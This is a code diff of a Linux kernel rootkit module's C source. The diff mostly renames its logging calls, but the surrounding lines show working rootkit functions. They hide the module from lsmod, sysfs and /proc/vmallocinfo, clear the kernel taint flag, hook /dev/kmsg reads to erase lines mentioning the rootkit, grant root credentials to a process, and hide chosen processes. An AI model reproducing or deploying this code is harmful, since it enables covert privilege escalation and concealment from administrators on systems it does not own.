@@ -67,7 +67,7 @@ static ssize_t do_kmsg_read_hooked(const proc_read_t orig_read, file_t *p_file, 
 {
     ssize_t sz_ret = 0; // Return value
 
-    pr_info("[ROOTKIT] `%ps()` hooked\n", orig_read);
+    pr_dev_info("`%ps()` hooked\n", orig_read);
 
     // Call the original function and filter the output
     sz_ret = orig_read(p_file, s_buf, sz_count, p_ppos);
@@ -77,7 +77,7 @@ static ssize_t do_kmsg_read_hooked(const proc_read_t orig_read, file_t *p_file, 
         sz_ret = hide_lines(s_buf, sz_ret, "rootkit");
     }
 
-    pr_info("[ROOTKIT] * `%ps()` returned %zd\n", orig_read, sz_ret);
+    pr_dev_info("* `%ps()` returned %zd\n", orig_read, sz_ret);
     return sz_ret;
 }
 
@@ -115,10 +115,10 @@ void hide_module(void)
     struct module_notes_attrs *notes_attrs = NULL;
     struct module_sect_attrs *sect_attrs   = NULL;
 
-    pr_info("[ROOTKIT] Hiding module...\n");
+    pr_dev_info("Hiding module...\n");
 
     IF_U (b_hidden) {
-        pr_warn("[ROOTKIT] * Rootkit is already hidden\n");
+        pr_dev_warn("* Rootkit is already hidden\n");
         return;
     }
 
@@ -126,65 +126,63 @@ void hide_module(void)
         p_tainted_mask = (unsigned long *)lookup_name("tainted_mask");
 
         IF_U (p_tainted_mask == NULL) {
-            pr_err("[ROOTKIT] * Failed to get `tainted_mask` address\n");
+            pr_dev_err("* Failed to get `tainted_mask` address\n");
         }
         else {
-            pr_info("[ROOTKIT] * Original tainted_mask: *%p = %lu\n", p_tainted_mask,
-                    *p_tainted_mask);
+            pr_dev_info("* Original tainted_mask: *%p = %lu\n", p_tainted_mask, *p_tainted_mask);
 
             clear_bit(TAINT_OOT_MODULE, p_tainted_mask);
 
-            pr_info("[ROOTKIT]   * Cleared TAINT_OOT_MODULE status\n");
-            pr_info("[ROOTKIT]   * Edited tainted_mask: *%p = %lu\n", p_tainted_mask,
-                    *p_tainted_mask);
+            pr_dev_info("  * Cleared TAINT_OOT_MODULE status\n");
+            pr_dev_info("  * Edited tainted_mask: *%p = %lu\n", p_tainted_mask, *p_tainted_mask);
         }
     }
 
     IF_L (p_vma_list == NULL) {
         p_vma_list = (struct list_head *)lookup_name("vmap_area_list");
     }
-    pr_info("[ROOTKIT] * p_vma_list: %p\n", p_vma_list);
+    pr_dev_info("* p_vma_list: %p\n", p_vma_list);
 
     IF_L (p_vma_root == NULL) {
         p_vma_root = (struct rb_root *)lookup_name("vmap_area_root");
     }
-    pr_info("[ROOTKIT] * p_vma_root: %p\n", p_vma_root);
+    pr_dev_info("* p_vma_root: %p\n", p_vma_root);
 
     IF_U (p_vma_list == NULL || p_vma_root == NULL) {
-        pr_err("[ROOTKIT] * Failed to get `vmap_area_list` or `vmap_area_root` address\n");
+        pr_dev_err("* Failed to get `vmap_area_list` or `vmap_area_root` address\n");
     }
     else {
         // Remove module from /proc/vmallocinfo
         list_for_each_entry_safe (p_vma, p_vma_tmp, p_vma_list, list) {
             if ((unsigned long)THIS_MODULE > p_vma->va_start &&
                 (unsigned long)THIS_MODULE < p_vma->va_end) {
-                pr_info("[ROOTKIT] * Removing VMAP area %p...", p_vma);
+                pr_dev_info("* Removing VMAP area %p...", p_vma);
                 list_del(&p_vma->list);
                 rb_erase(&p_vma->rb_node, p_vma_root);
-                pr_cont(" done\n");
+                pr_dev_cont(" done\n");
             }
         }
     }
 
     // Clear dependency list (see kernel/module.c)
     list_for_each_entry_safe (p_use, p_use_tmp, &THIS_MODULE->target_list, target_list) {
-        pr_info("[ROOTKIT] * Removing dependency source %p, target %p...", p_use->source->name,
-                p_use->target->name);
+        pr_dev_info("* Removing dependency source %p, target %p...", p_use->source->name,
+                    p_use->target->name);
         list_del(&p_use->source_list);
         list_del(&p_use->target_list);
         sysfs_remove_link(p_use->target->holders_dir, THIS_MODULE->name);
         kfree(p_use);
-        pr_cont(" done\n");
+        pr_dev_cont(" done\n");
     }
 
     // Clear notes_attr (see kernel/module.c)
     notes_attrs = THIS_MODULE->notes_attrs;
     IF_L (notes_attrs != NULL) {
-        pr_info("[ROOTKIT] * Removing notes_attr %p...", notes_attrs);
+        pr_dev_info("* Removing notes_attr %p...", notes_attrs);
         if (notes_attrs->dir != NULL) {
             i = THIS_MODULE->notes_attrs->notes;
             while (i-- > 0) {
-                pr_info("[ROOTKIT]   * Removing attr %u (%p)...", i, &notes_attrs->attrs[i]);
+                pr_dev_info("  * Removing attr %u (%p)...", i, &notes_attrs->attrs[i]);
                 sysfs_remove_bin_file(notes_attrs->dir, &notes_attrs->attrs[i]);
             }
             kobject_put(notes_attrs->dir);
@@ -196,10 +194,10 @@ void hide_module(void)
     // Clear sect_attrs (see kernel/module.c)
     sect_attrs = THIS_MODULE->sect_attrs;
     IF_L (sect_attrs != NULL) {
-        pr_info("[ROOTKIT] * Removing sect_attr %p...", sect_attrs);
+        pr_dev_info("* Removing sect_attr %p...", sect_attrs);
         sysfs_remove_group(&THIS_MODULE->mkobj.kobj, &sect_attrs->grp);
         for (i = 0; i < sect_attrs->nsections; i++) {
-            pr_info("[ROOTKIT]   * Freeing attr %u (%p)...", i, &sect_attrs->attrs[i]);
+            pr_dev_info("  * Freeing attr %u (%p)...", i, &sect_attrs->attrs[i]);
             kfree(sect_attrs->attrs[i].battr.attr.name);
         }
         kfree(sect_attrs);
@@ -221,20 +219,20 @@ void hide_module(void)
     list_del(&THIS_MODULE->mkobj.kobj.entry);
 
     // Hide dmesg entries
-    pr_info("[ROOTKIT] * Hiding dmesg entries...\n");
+    pr_dev_info("* Hiding dmesg entries...\n");
 
     IF_L (p_kmsg_proc_ops == NULL) {
         p_kmsg_proc_ops = (struct proc_ops *)lookup_name("kmsg_proc_ops");
     }
     IF_U (p_kmsg_proc_ops == NULL) {
-        pr_err("[ROOTKIT]   * Failed to get `kmsg_proc_ops` address\n");
+        pr_dev_err("  * Failed to get `kmsg_proc_ops` address\n");
     }
     else {
-        pr_info("[ROOTKIT]   * p_kmsg_proc_ops: %p\n", p_kmsg_proc_ops);
+        pr_dev_info("  * p_kmsg_proc_ops: %p\n", p_kmsg_proc_ops);
 
         IF_L (p_orig_kmsg_read == NULL) {
             p_orig_kmsg_read = p_kmsg_proc_ops->proc_read;
-            pr_info("[ROOTKIT]   * p_orig_kmsg_read: %p\n", p_orig_kmsg_read);
+            pr_dev_info("  * p_orig_kmsg_read: %p\n", p_orig_kmsg_read);
             change_protected_value(&p_kmsg_proc_ops->proc_read, kmsg_read_hooked);
         }
     }
@@ -243,21 +241,21 @@ void hide_module(void)
         p_kmsg_fops = (struct file_operations *)lookup_name("kmsg_fops");
     }
     IF_U (p_kmsg_fops == NULL) {
-        pr_err("[ROOTKIT]   * Failed to get `kmsg_fops` address\n");
+        pr_dev_err("  * Failed to get `kmsg_fops` address\n");
     }
     else {
-        pr_info("[ROOTKIT]   * p_kmsg_fops: %p\n", p_kmsg_fops);
+        pr_dev_info("  * p_kmsg_fops: %p\n", p_kmsg_fops);
 
         IF_L (p_orig_devkmsg_read == NULL) {
             p_orig_devkmsg_read = p_kmsg_fops->read;
-            pr_info("[ROOTKIT]   * p_orig_devkmsg_read: %p\n", p_orig_devkmsg_read);
+            pr_dev_info("  * p_orig_devkmsg_read: %p\n", p_orig_devkmsg_read);
             change_protected_value(&p_kmsg_fops->read, devkmsg_read_hooked);
         }
     }
 
     b_hidden = true;
 
-    pr_info("[ROOTKIT] Module was hidden\n");
+    pr_dev_info("Module was hidden\n");
 }
 
 long give_root(const pid_t i32_pid, const int i32_sig)
@@ -268,7 +266,7 @@ long give_root(const pid_t i32_pid, const int i32_sig)
     p_creds = prepare_creds();
 
     IF_U (p_creds == NULL) {
-        pr_err("[ROOTKIT] * Failed to get credentials\n");
+        pr_dev_err("* Failed to get credentials\n");
         return -EPERM;
     }
 
@@ -277,7 +275,7 @@ long give_root(const pid_t i32_pid, const int i32_sig)
 
     commit_creds(p_creds);
 
-    pr_info("[ROOTKIT] * Process is now root\n");
+    pr_dev_info("* Process is now root\n");
 
     return 0;
 }
@@ -289,10 +287,10 @@ static task_t *get_task_struct_by_pid(const pid_t i32_pid)
     IF_U (_find_get_task_by_vpid == NULL) {
         _find_get_task_by_vpid = (task_t * (*)(pid_t)) lookup_name("find_get_task_by_vpid");
 
-        pr_info("[ROOTKIT]   * `find_get_task_by_vpid()` address: %p\n", _find_get_task_by_vpid);
+        pr_dev_info("  * `find_get_task_by_vpid()` address: %p\n", _find_get_task_by_vpid);
 
         IF_U (_find_get_task_by_vpid == NULL) {
-            pr_err("[ROOTKIT]   * Failed to get `find_get_task_by_vpid()` address\n");
+            pr_dev_err("  * Failed to get `find_get_task_by_vpid()` address\n");
             return NULL;
         }
     }
@@ -318,7 +316,7 @@ static bool is_pid_in_list(pid_t *const p_pid, task_t **const pp_task,
     }
 
     IF_U (i32_pid == -1 && p_task == NULL) {
-        pr_warn("[ROOTKIT]   * is_pid_in_list: No PID or task given\n");
+        pr_dev_warn("  * is_pid_in_list: No PID or task given\n");
         return false;
     }
 
@@ -338,7 +336,7 @@ static bool is_pid_in_list(pid_t *const p_pid, task_t **const pp_task,
         }
 
         IF_U (p_task == NULL) {
-            pr_err("[ROOTKIT]   * Failed to get task struct\n");
+            pr_dev_err("  * Failed to get task struct\n");
             *pp_task = NULL;
             return false;
         }
@@ -349,30 +347,29 @@ static bool is_pid_in_list(pid_t *const p_pid, task_t **const pp_task,
     }
 
     BUG_ON(p_task->pid != i32_pid);
-    //pr_info("[ROOTKIT]   * Checking PID %d, task PID %d\n", i32_pid, p_task->pid);
+    //pr_dev_info("  * Checking PID %d, task PID %d\n", i32_pid, p_task->pid);
 
-    pr_info("[ROOTKIT]   * Task comm: %s", p_task->comm);
+    pr_dev_info("  * Task comm: %s", p_task->comm);
     IF_U (is_filename_hidden(p_task->comm)) {
-        pr_cont(" -> has hidden prefix\n");
+        pr_dev_cont(" -> has hidden prefix\n");
         b_ret = true;
         goto put_return;
     }
     else {
-        pr_cont(" -> no hidden prefix\n");
+        pr_dev_cont(" -> no hidden prefix\n");
     }
 
     // Check if the given PID is in the list
     list_for_each_entry (p_pid_entry, p_pid_list, list) {
-        pr_info("[ROOTKIT]   * Checking PID %d against given PID %d...", p_pid_entry->i32_pid,
-                i32_pid);
+        pr_dev_info("  * Checking PID %d against given PID %d...", p_pid_entry->i32_pid, i32_pid);
 
         IF_U (p_pid_entry->i32_pid == i32_pid) {
-            pr_cont(" yes!\n");
+            pr_dev_cont(" yes!\n");
             b_ret = true;
             goto put_return;
         }
         else {
-            pr_cont(" no\n");
+            pr_dev_cont(" no\n");
         }
     }
 
@@ -396,13 +393,13 @@ static bool is_pid_or_parent_in_list(const pid_t i32_pid, const struct list_head
         return false;
     }
 
-    pr_info("[ROOTKIT] * Checking if PID %d is in the list...\n", i32_real_pid);
+    pr_dev_info("* Checking if PID %d is in the list...\n", i32_real_pid);
 
     // Check the given PID, and get its task struct
     b_ret = is_pid_in_list(&i32_real_pid, &p_task, p_pid_list);
 
     IF_U (b_ret) {
-        pr_info("[ROOTKIT]   * PID %d matches!\n", i32_real_pid);
+        pr_dev_info("  * PID %d matches!\n", i32_real_pid);
         goto loop_end;
     }
 
@@ -426,13 +423,13 @@ static bool is_pid_or_parent_in_list(const pid_t i32_pid, const struct list_head
             break;
         }
 
-        pr_info("[ROOTKIT]   * Checking parent PID %d...", p_task_parent->pid);
+        pr_dev_info("  * Checking parent PID %d...", p_task_parent->pid);
 
         b_ret = is_pid_in_list(NULL, &p_task_parent, p_pid_list);
 
         IF_U (b_ret) {
-            pr_info("[ROOTKIT]   * PID %d matches (thanks to parent %d)!\n", i32_real_pid,
-                    p_task_parent->pid);
+            pr_dev_info("  * PID %d matches (thanks to parent %d)!\n", i32_real_pid,
+                        p_task_parent->pid);
             goto loop_end;
         }
     }
@@ -444,7 +441,7 @@ loop_end:
 
 bool is_pid_hidden(const pid_t i32_pid)
 {
-    pr_info("[ROOTKIT] * Checking if PID %d is hidden...\n", i32_pid);
+    pr_dev_info("* Checking if PID %d is hidden...\n", i32_pid);
 
     return is_pid_or_parent_in_list(i32_pid, &hidden_pids_list);
 }
@@ -461,11 +458,11 @@ long show_hide_process(const pid_t i32_pid, const int i32_sig)
 
     switch (i32_sig) {
     case SIGHIDE:
-        pr_info("[ROOTKIT] * Hiding process %d\n", i32_real_pid);
+        pr_dev_info("* Hiding process %d\n", i32_real_pid);
 
         p_hidden_pid = kzalloc(sizeof(pid_list_t), GFP_KERNEL);
         IF_U (p_hidden_pid == NULL) {
-            pr_err("[ROOTKIT]   * Failed to allocate memory for PID list entry\n");
+            pr_dev_err("  * Failed to allocate memory for PID list entry\n");
             return -EPERM;
         }
 
@@ -476,7 +473,7 @@ long show_hide_process(const pid_t i32_pid, const int i32_sig)
         break;
 
     case SIGSHOW:
-        pr_info("[ROOTKIT] * Unhiding process %d\n", i32_real_pid);
+        pr_dev_info("* Unhiding process %d\n", i32_real_pid);
 
         // Remove the given PID from the hidden list (if it is 0, remove the current PID)
         list_for_each_entry_safe (p_hidden_pid, p_tmp, &hidden_pids_list, list) {
@@ -488,7 +485,7 @@ long show_hide_process(const pid_t i32_pid, const int i32_sig)
         break;
 
     default:
-        pr_err("[ROOTKIT] * show_hide_process(): Invalid signal: %d\n", i32_sig);
+        pr_dev_err("* show_hide_process(): Invalid signal: %d\n", i32_sig);
         return -EINVAL;
     }
 
@@ -500,11 +497,11 @@ void show_all_processes(void)
     pid_list_t *p_hidden_pid = NULL; // Hidden PID list entry
     pid_list_t *p_tmp        = NULL; // Temporary pointer for iteration
 
-    pr_info("[ROOTKIT] Unhiding all processes...\n");
+    pr_dev_info("Unhiding all processes...\n");
 
     // Remove all PIDs from the hidden list
     list_for_each_entry_safe (p_hidden_pid, p_tmp, &hidden_pids_list, list) {
-        pr_info("[ROOTKIT] * Unhiding PID %d\n", p_hidden_pid->i32_pid);
+        pr_dev_info("* Unhiding PID %d\n", p_hidden_pid->i32_pid);
         list_del(&p_hidden_pid->list);
         kfree(p_hidden_pid);
     }
@@ -512,7 +509,7 @@ void show_all_processes(void)
 
 bool is_process_authorized(const pid_t i32_pid)
 {
-    pr_info("[ROOTKIT] * Checking if PID %d is authorized...\n", i32_pid);
+    pr_dev_info("* Checking if PID %d is authorized...\n", i32_pid);
 
     return is_pid_or_parent_in_list(i32_pid, &authorized_pids_list);
 }
@@ -526,11 +523,11 @@ long authorize_process(const pid_t i32_pid, const int i32_sig)
         return -EPERM;
     }
 
-    pr_info("[ROOTKIT] * Authorizing process %d\n", i32_real_pid);
+    pr_dev_info("* Authorizing process %d\n", i32_real_pid);
 
     p_authorized_pid = kzalloc(sizeof(pid_list_t), GFP_KERNEL);
     IF_U (p_authorized_pid == NULL) {
-        pr_err("[ROOTKIT]   * Failed to allocate memory for PID list entry\n");
+        pr_dev_err("  * Failed to allocate memory for PID list entry\n");
         return -EPERM;
     }
 
@@ -547,11 +544,11 @@ void clear_auth_list(void)
     pid_list_t *p_authorized_pid = NULL; // Authorized PID list entry
     pid_list_t *p_tmp            = NULL; // Temporary pointer for iteration
 
-    pr_info("[ROOTKIT] Clearing authorized process list...\n");
+    pr_dev_info("Clearing authorized process list...\n");
 
     // Remove all PIDs from the authorized list
     list_for_each_entry_safe (p_authorized_pid, p_tmp, &authorized_pids_list, list) {
-        pr_info("[ROOTKIT] * Removing PID %d from authorized list\n", p_authorized_pid->i32_pid);
+        pr_dev_info("* Removing PID %d from authorized list\n", p_authorized_pid->i32_pid);
         list_del(&p_authorized_pid->list);
         kfree(p_authorized_pid);
     }
@@ -559,40 +556,40 @@ void clear_auth_list(void)
 
 void restore_kmsg_read(void)
 {
-    pr_info("[ROOTKIT] Restoring `kmsg_read()`...\n");
+    pr_dev_info("Restoring `kmsg_read()`...\n");
 
     IF_U (p_kmsg_proc_ops == NULL) {
-        pr_err("[ROOTKIT] * `kmsg_proc_ops` is NULL\n");
+        pr_dev_err("* `kmsg_proc_ops` is NULL\n");
         return;
     }
 
     IF_U (p_orig_kmsg_read == NULL) {
-        pr_err("[ROOTKIT] * `p_orig_kmsg_read` is NULL\n");
+        pr_dev_err("* `p_orig_kmsg_read` is NULL\n");
         return;
     }
 
     p_kmsg_proc_ops->proc_read = p_orig_kmsg_read;
 
-    pr_info("[ROOTKIT] * `kmsg_read()` restored\n");
+    pr_dev_info("* `kmsg_read()` restored\n");
 }
 
 void restore_devkmsg_read(void)
 {
-    pr_info("[ROOTKIT] Restoring `devkmsg_read()`...\n");
+    pr_dev_info("Restoring `devkmsg_read()`...\n");
 
     IF_U (p_kmsg_fops == NULL) {
-        pr_err("[ROOTKIT] * `kmsg_fops` is NULL\n");
+        pr_dev_err("* `kmsg_fops` is NULL\n");
         return;
     }
 
     IF_U (p_orig_devkmsg_read == NULL) {
-        pr_err("[ROOTKIT] * `p_orig_devkmsg_read` is NULL\n");
+        pr_dev_err("* `p_orig_devkmsg_read` is NULL\n");
         return;
     }
 
     p_kmsg_fops->read = p_orig_devkmsg_read;
 
-    pr_info("[ROOTKIT] * `devkmsg_read()` restored\n");
+    pr_dev_info("* `devkmsg_read()` restored\n");
 }
 
 size_t hide_lines(char __user *const s_buffer, const size_t sz_len, const char *const s_search)
@@ -600,36 +597,36 @@ size_t hide_lines(char __user *const s_buffer, const size_t sz_len, const char *
     size_t sz_ret    = sz_len; // Return buffer size
     char *s_buffer_k = NULL;   // Kernel buffer
 
-    pr_info("[ROOTKIT] Checking lines to hide...\n");
+    pr_dev_info("Checking lines to hide...\n");
 
     s_buffer_k = kvmalloc(sz_len, GFP_KERNEL);
     IF_U (s_buffer_k == NULL) {
-        pr_err("[ROOTKIT] * Failed to allocate kernel buffer\n");
+        pr_dev_err("* Failed to allocate kernel buffer\n");
         goto ret;
     }
 
     IF_U (copy_from_user(s_buffer_k, s_buffer, sz_len) != 0) {
-        pr_err("[ROOTKIT] * Failed to copy buffer from user\n");
+        pr_dev_err("* Failed to copy buffer from user\n");
         goto free_ret;
     }
 
-    pr_info("[ROOTKIT] * Buffer: %s\n", s_buffer_k);
+    pr_dev_info("* Buffer: %s\n", s_buffer_k);
 
     IF_U (strnstr(s_buffer_k, s_search, sz_len) != NULL) {
-        pr_info("[ROOTKIT]   * Hiding line\n");
+        pr_dev_info("  * Hiding line\n");
         // Set the user buffer to "\n" and return size 1
         IF_U (copy_to_user(s_buffer, "\n", 1) != 0) {
-            pr_err("[ROOTKIT] * Failed to copy data to user\n");
+            pr_dev_err("* Failed to copy data to user\n");
             sz_ret = sz_len;
             goto free_ret;
         }
         IF_U (clear_user(s_buffer, sz_len) != 0) {
-            pr_err("[ROOTKIT] * Failed to clear user buffer\n");
+            pr_dev_err("* Failed to clear user buffer\n");
         }
         sz_ret = 1;
     }
     else {
-        pr_info("[ROOTKIT]   * Keeping line\n");
+        pr_dev_info("  * Keeping line\n");
     }
 
 free_ret:
@@ -647,41 +644,41 @@ ret:
 //     char *s_line       = NULL;   // Line pointer
 //     char *s_end        = NULL;   // End of line pointer
 
-//     pr_info("[ROOTKIT] Hiding lines...\n");
+//     pr_dev_info("Hiding lines...\n");
 
 //     s_buffer_k = kvmalloc(sz_len, GFP_KERNEL);
 //     IF_U (s_buffer_k == NULL) {
-//         pr_err("[ROOTKIT] * Failed to allocate kernel buffer\n");
+//         pr_dev_err("* Failed to allocate kernel buffer\n");
 //         goto ret;
 //     }
 
 //     IF_U (copy_from_user(s_buffer_k, s_buffer, sz_len) != 0) {
-//         pr_err("[ROOTKIT] * Failed to copy buffer from user\n");
+//         pr_dev_err("* Failed to copy buffer from user\n");
 //         goto free_ret;
 //     }
 
-//     pr_info("[ROOTKIT] * Buffer: %s\n", s_buffer_k);
+//     pr_dev_info("* Buffer: %s\n", s_buffer_k);
 
 //     s_result = kvmalloc(sz_len, GFP_KERNEL);
 //     IF_U (s_result == NULL) {
-//         pr_err("[ROOTKIT] * Failed to allocate result buffer\n");
+//         pr_dev_err("* Failed to allocate result buffer\n");
 //         goto free_ret;
 //     }
 
 //     s_line = s_buffer_k;
 
 //     while ((s_end = strnchr(s_line, sz_ret, '\n')) != NULL) {
-//         pr_info("[ROOTKIT] * Line: %s\n", s_line);
+//         pr_dev_info("* Line: %s\n", s_line);
 //         sz_line_len = s_end - s_line + 1;
 
 //         IF_U (strnstr(s_line, s_search, sz_line_len - 1) != NULL) {
-//             pr_info("[ROOTKIT]   * Hiding line\n");
+//             pr_dev_info("  * Hiding line\n");
 //             sz_ret -= sz_line_len;
 //             s_line = s_end + 1;
 //             continue;
 //         }
 
-//         pr_info("[ROOTKIT]   * Keeping line\n");
+//         pr_dev_info("  * Keeping line\n");
 
 //         strncat(s_result, s_line, sz_line_len);
 //         s_line = s_end + 1;
@@ -693,21 +690,21 @@ ret:
 //             continue;
 //         }
 
-//         pr_info("[ROOTKIT] * Line: %s\n", s_line);
+//         pr_dev_info("* Line: %s\n", s_line);
 
 //         if (strnstr(s_line, s_search, sz_len) != NULL) {
-//             pr_info("[ROOTKIT]   * Hiding line\n");
+//             pr_dev_info("  * Hiding line\n");
 //             continue;
 //         }
 
-//         pr_info("[ROOTKIT]   * Keeping line\n");
+//         pr_dev_info("  * Keeping line\n");
 //     }
 //     */
 
-//     pr_info("[ROOTKIT] * Result: %s\n", s_result);
+//     pr_dev_info("* Result: %s\n", s_result);
 
 //     IF_U (copy_to_user(s_buffer, s_result, sz_ret) != 0) {
-//         pr_err("[ROOTKIT] * Failed to copy buffer to user\n");
+//         pr_dev_err("* Failed to copy buffer to user\n");
 //         sz_ret = sz_len;
 //         goto free_res;
 //     }
@@ -715,7 +712,7 @@ ret:
 //     IF_U (sz_ret < sz_len) {
 //         // Erase the rest of the user buffer to avoid leaking data
 //         IF_U (clear_user(s_buffer + sz_ret, sz_len - sz_ret) != 0) {
-//             pr_err("[ROOTKIT] * Failed to clear user buffer\n");
+//             pr_dev_err("* Failed to clear user buffer\n");
 //             goto free_res;
 //         }
 //     }
